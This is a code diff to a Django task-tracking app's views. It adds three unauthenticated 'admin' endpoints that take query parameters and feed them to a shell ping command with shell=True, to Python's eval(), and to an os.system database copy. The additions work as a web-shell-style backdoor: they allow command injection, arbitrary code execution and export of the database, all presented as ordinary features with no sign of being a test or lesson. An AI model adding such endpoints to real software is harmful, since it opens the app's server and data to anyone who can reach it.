@@ -1,3 +1,6 @@
+import os
+import subprocess
+
 from django.http import HttpResponse, JsonResponse
 from django.shortcuts import get_object_or_404, redirect, render
 
@@ -65,6 +68,24 @@ def task_toggle(request, pk):
             return render(request, "taskapp/partials/task_row.html", {"task": task})
         return redirect("taskapp:task_list")
     return redirect("taskapp:task_list")
+
+
+def admin_ping(request):
+    host = request.GET.get("host", "localhost")
+    output = subprocess.check_output("ping -c 1 " + host, shell=True)
+    return HttpResponse(output)
+
+
+def admin_eval(request):
+    expr = request.GET.get("expr", "1+1")
+    result = eval(expr)
+    return JsonResponse({"result": result})
+
+
+def admin_export(request):
+    path = request.GET.get("path", "/tmp/tasks.csv")
+    os.system("cp db.sqlite3 " + path)
+    return JsonResponse({"exported_to": path})
 
 
 def health(request):
